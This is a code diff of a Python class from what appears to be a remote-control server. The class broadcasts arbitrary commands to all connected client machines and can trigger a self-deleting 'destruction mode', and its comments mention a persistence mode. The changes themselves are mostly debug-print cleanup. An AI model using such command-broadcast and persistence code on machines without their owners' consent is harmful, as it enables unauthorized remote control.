@@ -1,3 +1,5 @@
+import time
+
 from .handler import Handler
 
 from .other import printColor
@@ -33,7 +35,7 @@ class Broadcast:
 
 """) 
 
-    def aSingleRunMod(self):
+    def aSingleRunMod(self): #broadcast
         '''
         Allows you not to send the same modes multiple times on the same machine. 
         This method is very useful for the destroy mode and persistence mode. 
@@ -48,9 +50,7 @@ class Broadcast:
         
         for key in copy_dict_conn.keys():
             #print("\nFirst key-->", key)
-            #print("First Value -->", Handler.dict_conn[key] )
-            #if(key == 0): #if first iteration    
-            #    dict_sorts[key] = Handler.dict_conn[key]
+            #print("First Value -->", dict_conn[key] )
             
             for key_of_dict_sorts in dict_sorts:
                 if(dict_sorts[key_of_dict_sorts][NB_TOKEN] == copy_dict_conn[key][NB_TOKEN]):
@@ -59,18 +59,15 @@ class Broadcast:
                     pass
             
             if not (already_dict) and copy_dict_conn[key][NB_ALIVE] : #Value already existing and now online
-                #print("\n\n\nappend dict -->",key)
-                #print("is onligne: ", copy_dict_conn[key][NB_ALIVE])
-                #print("content: ", copy_dict_conn[key], "\n\n")
                 dict_sorts[key] = copy_dict_conn[key]
 
             already_dict = False #reset 
-       
+        
         return dict_sorts
-    
+        
+
     def executeCommand(self,cmd_list):
         '''-c'''
-       # print("-->",cmd_list)
         
         cmd_list.pop(0) #delete "-c"
         
@@ -79,12 +76,13 @@ class Broadcast:
 
         for char in tmp_cmd: 
             if(char == "\""): #remove "
-                #print("char detect: ",char)
                 pass
+
             elif(char == " "): #if space
-               # print("space")
+            
                 cmd += " "
             else:
+            
                 cmd += char
         
         self.broadcast_to_all_clients(cmd) #send command for all client
@@ -95,21 +93,14 @@ class Broadcast:
     def destruction_for_all_clients(self):
         #Launches a process (.bat file) to delete the program and then exits the program. 
         
-        print("\ndestruction_for_all_clients: \n\n\n")
         dict_sorts = self.aSingleRunMod()
-        print(dict_sorts)
-        print(len(dict_sorts))
 
-        printColor("information","\n[!] are you sure you want to run the destruction mode on all customers ? Once the destruction mode is activated, the clients will no longer be accessible.\nIf you are sure of your choice enter Y if not enter N.\n")
+        printColor("information","\n[!] Are you sure you want to run the destruction mode on all customers ? Once the destruction mode is activated, the clients will no longer be accessible.\nIf you are sure of your choice enter Y if not enter N.\n")
 
         if(areYouSure()):
             request = "MOD_DESTRUCTION:broadcast"
             
-        
             for key in dict_sorts.keys():
-               
-                print("Key: ", key)
-                print("alive: ",dict_sorts[key][NB_ALIVE])
 
                 if(dict_sorts[key][NB_ALIVE]):
                     if CheckConn().sendsafe(key, dict_sorts[key][NB_SOCKET], request,False): 
@@ -129,6 +120,8 @@ class Broadcast:
                     pass
         else:
             pass
+
+        time.sleep(2) #Allows to wait for all connections to end (optional)
 
     def disconnection_for_all_clients(self):
         pass
@@ -198,8 +191,6 @@ class Broadcast:
                         pass
 
 
-                print("\n")
         else:
             printColor("error","[+] No connection is enabled.\n")
-        
-        printColor("information", "[-] In MOD_MAIN\n")
+
